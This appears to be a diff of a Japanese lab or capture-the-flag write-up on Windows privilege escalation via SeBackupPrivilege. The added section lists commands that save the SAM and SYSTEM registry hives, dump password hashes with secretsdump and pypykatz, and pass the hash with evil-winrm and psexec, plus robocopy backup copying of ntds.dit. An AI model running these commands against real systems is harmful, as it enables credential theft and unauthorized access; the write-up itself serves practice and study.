@@ -29,7 +29,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-# 一番手っ取り早い方法
+# 一番手っ取り早い方法（adminのファイル読むだけなら）
 
 [このスクリプト](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)を使う：
 
@@ -41,9 +41,30 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 `whoami`でsystemとは出ないが、確かにroot.txtが読めた。すなわちsystem権限を奪取した。
 
+# シェルをとる
 
+```
+reg save hklm\sam .\sam
+reg save hklm\system .\sytem
+```
 
-# 実際にやってみた（参考：[Windows PrivEsc with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)）
+これらをKaliに送ってハッシュダンプ：
+
+```
+impacket-secretsdump -sam sam -system system LOCAL
+
+pypykatz registry --sam sam system
+```
+
+あとはpass the hash：
+
+```
+evil-winrm -i <target IP> -u <username> -H <NThash>
+
+rlwrap impacket-psexec  <username>@<target IP> -hashes <LMhash:NThash>
+```
+
+# これもあり（参考：[Windows PrivEsc with SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)）
 
 ntds.ditのコピーにおいて、普通の`copy`コマンドではpermission deniedになってしまう。そこで`robocopy`を使う。特に`/b`（または`/B`）フラグで**バックアップとして**コピーができる。つまりAdmin権限がなくても、backupユーザの権限があればpermission deniedにならない（[robocopyについての詳細](https://n-archives.net/software/robosync/articles/robocopy-specs-and-command/#i-3-1)）
 
